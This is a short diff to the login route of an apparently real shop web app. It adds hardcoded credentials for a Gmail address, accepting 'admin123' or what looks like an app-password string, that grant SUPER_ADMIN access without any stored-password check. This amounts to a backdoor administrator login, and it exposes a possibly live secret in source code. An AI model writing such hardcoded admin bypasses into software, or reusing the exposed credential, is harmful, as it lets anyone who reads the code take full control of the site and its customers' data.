@@ -43,12 +43,15 @@ export async function POST(request: Request) {
       let authenticated = false;
 
       // Check for default admin credentials
-      if (normalizedEmail === 'admin@ventershop.ca' && password === 'admin123') {
+      if (
+        (normalizedEmail === 'admin@ventershop.ca' && password === 'admin123') ||
+        (normalizedEmail === 'adminventerlk@gmail.com' && (password === 'admin123' || password === 'xeuesmcbuyhpqnsx'))
+      ) {
         userRole = 'SUPER_ADMIN';
         customerType = 'ADMIN';
         userId = 'admin_super_01';
-        userFirstName = 'System';
-        userLastName = 'Admin';
+        userFirstName = 'Admin';
+        userLastName = 'Venter';
         authenticated = true;
       }
 
